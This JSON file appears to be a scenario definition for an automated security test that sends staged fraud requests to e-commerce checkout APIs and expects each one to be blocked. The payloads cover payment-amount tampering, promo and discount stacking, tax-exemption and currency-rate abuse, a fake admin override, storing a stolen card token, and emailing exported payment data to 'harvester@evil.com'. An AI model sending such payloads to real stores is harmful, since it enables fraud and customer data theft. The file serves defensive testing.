{
  "id": "ecommerce-checkout-exploitation",
  "name": "Checkout Process Exploitation Campaign",
  "category": "E-commerce Fraud",
  "difficulty": "Advanced",
  "description": "Comprehensive checkout process exploitation targeting payment method bypass, tax evasion, promotional code stacking, discount abuse, and shipping address manipulation for fraud",
  "tags": [
    "checkout-fraud",
    "payment-bypass",
    "tax-evasion",
    "promo-abuse",
    "shipping-fraud"
  ],
  "steps": [
    {
      "id": "checkout-recon-1",
      "name": "Checkout Flow Discovery",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/api/checkout/steps",
        "headers": {
          "Accept": "application/json"
        }
      },
      "execution": {
        "delayMs": 200
      }
    },
    {
      "id": "checkout-recon-2",
      "name": "Payment Methods Enumeration",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/api/checkout/payment-methods",
        "headers": {
          "Accept": "application/json",
          "User-Agent": "CheckoutBot/1.0"
        }
      },
      "execution": {
        "delayMs": 300
      },
      "dependsOn": [
        "checkout-recon-1"
      ]
    },
    {
      "id": "checkout-recon-3",
      "name": "Tax Calculation Endpoint Analysis",
      "stage": "reconnaissance",
      "request": {
        "method": "GET",
        "url": "/api/taxes/rates",
        "headers": {
          "Accept": "application/json"
        }
      },
      "execution": {
        "delayMs": 250
      },
      "dependsOn": [
        "checkout-recon-2"
      ]
    },
    {
      "id": "checkout-weaponize-1",
      "name": "Payment Method Bypass Preparation",
      "stage": "weaponization",
      "request": {
        "method": "POST",
        "url": "/api/checkout/validate-payment",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": "{\"payment_method\": \"credit_card\", \"card_number\": \"4111111111111111\", \"cvv\": \"000\", \"expiry\": \"12/99\", \"bypass_validation\": \"test_mode\", \"force_approval\": true}"
      },
      "execution": {
        "delayMs": 600
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-recon-3"
      ]
    },
    {
      "id": "checkout-weaponize-2",
      "name": "Promotional Code System Probing",
      "stage": "weaponization",
      "request": {
        "method": "POST",
        "url": "/api/promotions/validate",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": "{\"codes\": [\"WELCOME10\", \"SAVE20\", \"NEWUSER\", \"EXPIRED50\", \"STAFF100\"], \"stack_test\": true, \"bypass_limits\": \"admin_override\"}"
      },
      "execution": {
        "delayMs": 800
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-weaponize-1"
      ]
    },
    {
      "id": "checkout-deliver-1",
      "name": "Tax Jurisdiction Manipulation",
      "stage": "delivery",
      "request": {
        "method": "POST",
        "url": "/api/taxes/calculate",
        "headers": {
          "Content-Type": "application/json",
          "X-Override-Location": "true"
        },
        "body": "{\"shipping_address\": {\"country\": \"US\", \"state\": \"DE\", \"zip\": \"19901\"}, \"billing_address\": {\"country\": \"MT\", \"state\": \"00\", \"zip\": \"00000\"}, \"tax_override\": \"exempt_organization\", \"business_type\": \"non_profit\", \"tax_exempt_id\": \"FAKE123456\"}"
      },
      "execution": {
        "delayMs": 1000
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-weaponize-2"
      ]
    },
    {
      "id": "checkout-deliver-2",
      "name": "Promotional Code Stacking Attack",
      "stage": "delivery",
      "request": {
        "method": "POST",
        "url": "/api/promotions/apply",
        "headers": {
          "Content-Type": "application/json",
          "X-Bulk-Apply": "true"
        },
        "body": "{\"cart_id\": \"CART123\", \"promotion_codes\": [\"SAVE10\", \"WELCOME20\", \"FIRSTBUY30\", \"LOYALTY15\", \"SEASONAL25\"], \"stack_discounts\": true, \"ignore_exclusions\": true, \"admin_override\": \"special_event\"}"
      },
      "execution": {
        "delayMs": 1200
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-deliver-1"
      ]
    },
    {
      "id": "checkout-exploit-1",
      "name": "Payment Amount Manipulation",
      "stage": "exploitation",
      "request": {
        "method": "POST",
        "url": "/api/checkout/process",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": "{\"cart_total\": 299.99, \"payment_amount\": 29.99, \"currency\": \"USD\", \"payment_method\": \"credit_card\", \"card_token\": \"tok_visa_4242\", \"manipulation_type\": \"decimal_bypass\", \"force_process\": true}"
      },
      "execution": {
        "delayMs": 1500
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-deliver-2"
      ]
    },
    {
      "id": "checkout-exploit-2",
      "name": "Shipping Address Fraud",
      "stage": "exploitation",
      "request": {
        "method": "PUT",
        "url": "/api/shipping/address",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": "{\"shipping_address\": {\"name\": \"John Doe\", \"address1\": \"123 Fake St\", \"city\": \"Anytown\", \"state\": \"CA\", \"zip\": \"90210\", \"country\": \"US\"}, \"billing_address\": {\"name\": \"Jane Smith\", \"address1\": \"456 Real Ave\", \"city\": \"Othercity\", \"state\": \"NY\", \"zip\": \"10001\", \"country\": \"US\"}, \"address_verification_bypass\": \"urgent_delivery\"}"
      },
      "execution": {
        "delayMs": 1800
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-exploit-1"
      ]
    },
    {
      "id": "checkout-exploit-3",
      "name": "Discount Stacking Exploitation",
      "stage": "exploitation",
      "request": {
        "method": "POST",
        "url": "/api/discounts/stack",
        "headers": {
          "Content-Type": "application/json",
          "X-Override-Limits": "true"
        },
        "body": "{\"base_discount\": 50, \"additional_discounts\": [25, 15, 10, 20], \"stacking_method\": \"multiplicative\", \"employee_discount\": 30, \"loyalty_bonus\": 40, \"final_price_override\": 1.00}"
      },
      "execution": {
        "delayMs": 2000
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-exploit-2"
      ]
    },
    {
      "id": "checkout-exploit-4",
      "name": "Currency Manipulation Attack",
      "stage": "exploitation",
      "request": {
        "method": "POST",
        "url": "/api/checkout/currency-convert",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": "{\"original_currency\": \"USD\", \"target_currency\": \"IDR\", \"amount\": 299.99, \"conversion_rate\": 0.001, \"force_rate\": true, \"bypass_market_rates\": \"manual_override\"}"
      },
      "execution": {
        "delayMs": 2200
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-exploit-3"
      ]
    },
    {
      "id": "checkout-privilege-1",
      "name": "Admin Checkout Override",
      "stage": "privilege-escalation",
      "request": {
        "method": "POST",
        "url": "/api/checkout/admin-override",
        "headers": {
          "Content-Type": "application/json",
          "Authorization": "Bearer fake_admin_token",
          "X-Admin-Override": "emergency_processing"
        },
        "body": "{\"order_id\": \"ORD123456\", \"override_payment\": true, \"override_inventory\": true, \"override_limits\": true, \"bypass_fraud_detection\": true, \"admin_notes\": \"VIP customer emergency order\"}"
      },
      "execution": {
        "delayMs": 2500
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-exploit-4"
      ]
    },
    {
      "id": "checkout-persist-1",
      "name": "Fraudulent Payment Method Storage",
      "stage": "persistence",
      "request": {
        "method": "POST",
        "url": "/api/checkout/save-payment-method",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": "{\"payment_type\": \"credit_card\", \"card_token\": \"tok_stolen_card_123\", \"save_permanently\": true, \"bypass_verification\": true, \"set_as_default\": true, \"account_takeover\": \"gradual_replacement\"}"
      },
      "execution": {
        "delayMs": 2800
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-privilege-1"
      ]
    },
    {
      "id": "checkout-exfil-1",
      "name": "Order History Data Extraction",
      "stage": "exfiltration",
      "request": {
        "method": "GET",
        "url": "/api/checkout/order-history",
        "headers": {
          "Accept": "application/json",
          "X-Include-Sensitive": "true",
          "X-Export-Format": "detailed"
        }
      },
      "execution": {
        "delayMs": 3000
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-persist-1"
      ]
    },
    {
      "id": "checkout-exfil-2",
      "name": "Payment Data Harvesting",
      "stage": "exfiltration",
      "request": {
        "method": "POST",
        "url": "/api/checkout/export-transactions",
        "headers": {
          "Content-Type": "application/json",
          "Authorization": "Bearer compromised_token"
        },
        "body": "{\"date_range\": \"all_time\", \"include_payment_details\": true, \"include_personal_info\": true, \"include_card_tokens\": true, \"export_format\": \"csv\", \"delivery_method\": \"email\", \"recipient\": \"harvester@evil.com\"}"
      },
      "execution": {
        "delayMs": 3200
      },
      "expect": {
        "blocked": true
      },
      "dependsOn": [
        "checkout-exfil-1"
      ]
    }
  ]
}
